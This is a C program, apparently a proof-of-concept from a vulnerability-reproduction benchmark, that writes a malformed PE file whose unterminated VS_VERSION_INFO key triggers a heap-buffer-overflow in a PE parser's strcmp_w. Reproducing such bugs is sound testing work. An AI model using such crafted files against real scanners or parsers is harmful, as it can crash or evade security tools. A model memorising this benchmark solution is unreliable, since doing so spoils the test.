#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:3848 */
/* Triggers: heap-buffer-overflow in strcmp_w (called before wide_string_fits_in_pe) */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // DOS header: magic 'MZ' + minimal header (64 bytes)
    fputc('M', f);
    fputc('Z', f);
    for (int i = 0; i < 62; i++) {
        fputc(0, f);
    }

    // PE signature: "PE\0\0"
    fputc('P', f);
    fputc('E', f);
    fputc(0, f);
    fputc(0, f);

    // COFF header (20 bytes)
    fputc(0x4c, f); fputc(0x01, f); // Machine: i386
    fputc(1, f); fputc(0, f);       // NumberOfSections
    fputc(0, f); fputc(0, f);       // TimeDateStamp
    fputc(0, f); fputc(0, f);       // PointerToSymbolTable
    fputc(0, f); fputc(0, f);       // NumberOfSymbols
    fputc(0xe0, f); fputc(0, f);    // SizeOfOptionalHeader
    fputc(0x02, f); fputc(0x01, f); // Characteristics

    // PE optional header (224 bytes)
    fputc(0x0b, f); fputc(0x01, f); // Magic: PE32
    fputc(0, f); fputc(0, f);       // MajorLinkerVersion, MinorLinkerVersion
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfCode
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfInitializedData
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfUninitializedData
    for (int i = 0; i < 4; i++) fputc(0, f); // AddressOfEntryPoint
    for (int i = 0; i < 4; i++) fputc(0, f); // BaseOfCode
    for (int i = 0; i < 4; i++) fputc(0, f); // BaseOfData
    for (int i = 0; i < 4; i++) fputc(0, f); // ImageBase
    fputc(0x10, f); fputc(0, f); fputc(0, f); fputc(0, f); // SectionAlignment
    fputc(0x10, f); fputc(0, f); fputc(0, f); fputc(0, f); // FileAlignment
    for (int i = 0; i < 8; i++) fputc(0, f); // Major/Minor OS/Subsystem versions
    for (int i = 0; i < 4; i++) fputc(0, f); // Win32VersionValue
    fputc(0x10, f); fputc(0, f); fputc(0, f); fputc(0, f); // SizeOfImage
    fputc(0x10, f); fputc(0, f); fputc(0, f); fputc(0, f); // SizeOfHeaders
    for (int i = 0; i < 4; i++) fputc(0, f); // CheckSum
    fputc(2, f); fputc(0, f); // Subsystem
    fputc(0, f); fputc(0, f); // DllCharacteristics
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfStackReserve
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfStackCommit
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfHeapReserve
    for (int i = 0; i < 4; i++) fputc(0, f); // SizeOfHeapCommit
    for (int i = 0; i < 4; i++) fputc(0, f); // LoaderFlags
    fputc(0x10, f); fputc(0, f); fputc(0, f); fputc(0, f); // NumberOfRvaAndSizes

    // Data directories (128 bytes) - set resource entry at index 2
    for (int i = 0; i < 128; i++) {
        fputc(0, f);
    }
    // Patch resource directory entry (offset 2*8=16 from data dir start)
    long data_dir_start = 64 + 4 + 20 + 224;
    fseek(f, data_dir_start + 2 * 8, SEEK_SET);
    fputc(0x00, f); fputc(0x20, f); fputc(0, f); fputc(0, f); // VirtualAddress = 0x2000
    fputc(0x00, f); fputc(0x01, f); fputc(0, f); fputc(0, f); // Size = 0x100

    // Section table: one section ".rsrc"
    fseek(f, data_dir_start + 128, SEEK_SET);
    fputc('.', f); fputc('r', f); fputc('s', f); fputc('r', f); fputc('c', f);
    fputc(0, f); fputc(0, f); fputc(0, f);
    fputc(0x00, f); fputc(0x01, f); fputc(0, f); fputc(0, f); // VirtualSize = 0x100
    fputc(0x00, f); fputc(0x20, f); fputc(0, f); fputc(0, f); // VirtualAddress = 0x2000
    fputc(0x00, f); fputc(0x01, f); fputc(0, f); fputc(0, f); // SizeOfRawData = 0x100
    fputc(0x00, f); fputc(0x02, f); fputc(0, f); fputc(0, f); // PointerToRawData = 0x200
    for (int i = 0; i < 16; i++) fputc(0, f); // Reloc, linenumbers, etc.
    fputc(0x40, f); fputc(0x00, f); fputc(0x00, f); fputc(0x40, f); // Characteristics

    // Pad to offset 0x200
    long pos = ftell(f);
    for (long i = pos; i < 0x200; i++) {
        fputc(0, f);
    }

    // Resource directory at offset 0x200 (RVA 0x2000)
    // Root directory: 1 entry for type 16 (VERSION)
    for (int i = 0; i < 16; i++) fputc(0, f);
    fputc(1, f); fputc(0, f); // NumberOfIdEntries = 1

    // Entry for type 16: ID=16, offset to next directory = 0x20
    fputc(16, f); fputc(0, f);
    fputc(0, f); fputc(0, f);
    fputc(0x20, f); fputc(0, f); fputc(0, f); fputc(0, f);

    // Pad to offset 0x20
    pos = ftell(f) - 0x200;
    for (long i = pos; i < 0x20; i++) {
        fputc(0, f);
    }

    // Level 1 directory: 1 entry for ID=1
    for (int i = 0; i < 16; i++) fputc(0, f);
    fputc(1, f); fputc(0, f); // NumberOfIdEntries = 1

    // Entry for ID=1: ID=1, offset to data entry = 0x80000030
    fputc(1, f); fputc(0, f);
    fputc(0x30, f); fputc(0x00, f); fputc(0x00, f); fputc(0x80, f);

    // Pad to offset 0x30
    pos = ftell(f) - 0x200;
    for (long i = pos; i < 0x30; i++) {
        fputc(0, f);
    }

    // IMAGE_RESOURCE_DATA_ENTRY at offset 0x30
    // OffsetToData = RVA 0x2040 (offset 0x40 within .rsrc)
    fputc(0x40, f); fputc(0x20, f); fputc(0, f); fputc(0, f);
    // Size = 0x50 (enough for extended version info)
    fputc(0x50, f); fputc(0, f); fputc(0, f); fputc(0, f);
    for (int i = 0; i < 8; i++) fputc(0, f); // CodePage + Reserved

    // Pad to offset 0x40
    pos = ftell(f) - 0x200;
    for (long i = pos; i < 0x40; i++) {
        fputc(0, f);
    }

    // VS_VERSION_INFO structure at offset 0x40 (RVA 0x2040)
    // Write wLength = 0x28 (40 bytes) - header(6) + key(32) + padding(2) = 40
    fputc(0x28, f); fputc(0, f);

    // wValueLength = 0 (no fixed file info)
    fputc(0, f); fputc(0, f);

    // wType = 1 (text)
    fputc(1, f); fputc(0, f);

    // szKey: write full "VS_VERSION_INFO" (16 wide chars, 32 bytes) WITHOUT null terminator
    char key[] = "VS_VERSION_INFO";
    for (int i = 0; key[i] != 0; i++) {
        fputc(key[i], f);
        fputc(0, f);
    }

    // Write 2 more non-null wide chars (e.g., 'X') to make total 40 bytes
    // This ensures fits_in_pe sees 34 bytes after key start
    fputc('X', f); fputc(0, f);
    fputc('X', f); fputc(0, f);

    // Now pad the file further to ensure fits_in_pe(Key, 34) passes
    // Key is at file offset 0x200 + 0x40 + 6 = 0x246
    // We need at least 34 bytes after key, so file must be >= 0x246 + 34 = 0x268
    // Current position is 0x200 + 0x40 + 40 = 0x200 + 0x68 = 0x268
    // Write additional non-null padding to give more room
    for (int i = 0; i < 10; i++) {
        fputc('Y', f);
        fputc(0, f);
    }

    fclose(f);
    return 0;
}